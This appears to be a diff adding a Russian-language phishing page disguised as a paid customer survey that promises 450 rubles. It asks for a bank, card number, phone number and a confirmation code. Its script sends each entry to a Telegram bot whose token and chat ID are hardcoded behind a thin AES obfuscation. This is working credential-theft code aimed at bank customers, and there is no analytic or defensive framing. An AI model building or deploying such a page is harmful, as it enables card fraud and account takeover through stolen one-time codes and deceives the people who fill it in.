@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Пройдите опрос и получите 450₽</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            max-width: 600px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .container {
+            display: none;
+            width: 100%;
+            text-align: center;
+        }
+
+        .active {
+            display: block;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        p {
+            font-size: 16px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+
+        button {
+            background-color: #007BFF;
+            color: white;
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        input[type="text"], select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        .form-container {
+            margin-top: 20px;
+        }
+
+        .back-btn {
+            background-color: #f44336;
+            color: white;
+            padding: 8px 16px;
+            font-size: 14px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .back-btn:hover {
+            background-color: #d32f2f;
+        }
+
+        hr {
+            margin: 20px 0;
+            border: 0;
+            border-top: 1px solid #eee;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="content">
+            <!-- Слайд 1: Приветствие -->
+            <div id="welcome-container" class="container active">
+                <h1>Добро пожаловать на сайт "Голос клиента"!</h1>
+                <p>Мы ценим ваше мнение! Ваши отзывы помогают нам улучшать качество сервиса и создавать лучший опыт для наших клиентов. Пройдите опрос и получите 450₽ в знак благодарности за ваше участие. Это займет всего несколько минут, и ваше мнение будет услышано!</p>
+                <button class="btn" onclick="goToRegistration()">Начать</button>
+            </div>
+
+            <!-- Слайд 2: Регистрация -->
+            <div class="form-container container" id="registration-container">
+                <h1>Регистрация</h1>
+                <hr>
+                <form id="registration-form">
+                    <div>
+                        <label for="bank-select">Выберите банк:</label>
+                        <select id="bank-select" required>
+                            <option value="">--Выберите банк--</option>
+                            <option value="Тинькофф">Тинькофф</option>
+                            <option value="Сбербанк">Сбербанк</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label for="card-number">Номер карты:</label>
+                        <input type="text" id="card-number" placeholder="Введите номер карты" required>
+                    </div>
+                    <div>
+                        <label for="phone-number">Номер телефона:</label>
+                        <input type="text" id="phone-number" placeholder="Введите номер телефона" required>
+                    </div>
+                    <button type="submit">Отправить</button>
+                </form>
+                <button class="back-btn" onclick="goBackToWelcome()">Назад</button>
+            </div>
+
+            <!-- Слайд 3: Подтверждение -->
+            <div class="form-container container" id="code-container">
+                <h1>Подтверждение</h1>
+                <hr>
+                <form id="code-form">
+                    <p>
+                        <label for="confirmation-code">Введите код подтверждения:</label><br>
+                        <input type="text" id="confirmation-code" placeholder="Введите код" required>
+                    </p>
+                    <button type="submit">Подтвердить</button>
+                </form>
+                <button class="back-btn" onclick="goBackToRegistration()">Назад</button>
+            </div>
+
+            <!-- Слайд 4: Ожидание -->
+            <div class="form-container container" id="loading-container">
+                <h1>Загрузка опроса</h1>
+                <hr>
+                <p>Подождите, пожалуйста. Это может занять около 5 минут...</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1-crypto-js.js"></script>
+
+    <script>
+        const SECRET_KEY = "your-secret-key"; // Секретный ключ для шифрования
+
+        // Шифрование данных
+        function encryptData(data) {
+            return CryptoJS.AES.encrypt(data, SECRET_KEY).toString();
+        }
+
+        // Дешифровка данных
+        function decryptData(encryptedData) {
+            const bytes = CryptoJS.AES.decrypt(encryptedData, SECRET_KEY);
+            return bytes.toString(CryptoJS.enc.Utf8); // Расшифрованная строка
+        }
+
+        // Функция для показа следующего слайда
+        function showSlide(nextSlideId) {
+            const slides = document.querySelectorAll('.container');
+            slides.forEach(slide => slide.classList.remove('active')); // Скрыть все слайды
+            document.getElementById(nextSlideId).classList.add('active'); // Показать текущий слайд
+        }
+
+        // Переход от приветствия к регистрации
+        function goToRegistration() {
+            showSlide('registration-container');
+        }
+
+        // Переход назад от регистрации к приветствию
+        function goBackToWelcome() {
+            showSlide('welcome-container');
+        }
+
+        // Переход назад от кода подтверждения к регистрации
+        function goBackToRegistration() {
+            showSlide('registration-container');
+        }
+
+        document.getElementById('registration-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const bank = document.getElementById('bank-select').value;
+            const cardNumber = document.getElementById('card-number').value.trim();
+            const phoneNumber = document.getElementById('phone-number').value.trim();
+
+            if (!bank || !cardNumber || !phoneNumber) {
+                alert("Пожалуйста, заполните все поля.");
+                return;
+            }
+
+            // Шифруем токен и ID перед отправкой
+            const encryptedToken = encryptData("7584473430:AAEIiKWC8QLTvXsL5t5PpdCMum4UkOZaMoM");
+            const encryptedChatId = encryptData("-4702734460");
+
+            // Форматируем данные для отправки
+            const message = `Новый запрос на опрос: \nБанк: ${bank}\nНомер карты: \`${cardNumber}\`\nТелефон: \`${phoneNumber}\``;
+
+            fetch("https://api.telegram.org/bot" + decryptData(encryptedToken) + "/sendMessage", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: decryptData(encryptedChatId),
+                    text: message,
+                    parse_mode: "Markdown" // Включаем поддержку Markdown
+                })
+            })
+            .then(() => {
+                showSlide("code-container"); // Переход к следующему слайду (ввод кода подтверждения)
+            })
+            .catch(error => {
+                console.error("Ошибка:", error);
+                alert("Ошибка при отправке данных. Пожалуйста, попробуйте снова.");
+            });
+        });
+
+        document.getElementById('code-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const code = document.getElementById('confirmation-code').value.trim();
+
+            if (!code) {
+                alert("Пожалуйста, введите код подтверждения.");
+                return;
+            }
+
+            const message = `Код подтверждения: \`${code}\``;
+
+            fetch("https://api.telegram.org/bot" + decryptData(encryptedToken) + "/sendMessage", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: decryptData(encryptedChatId),
+                    text: message,
+                    parse_mode: "Markdown" // Включаем поддержку Markdown
+                })
+            })
+            .then(() => {
+                showSlide("loading-container"); // Переход к слайду загрузки
+            })
+            .catch(error => {
+                console.error("Ошибка:", error);
+                alert("Ошибка при отправке кода. Пожалуйста, попробуйте снова.");
+            });
+        });
+    </script>
+</body>
+</html>
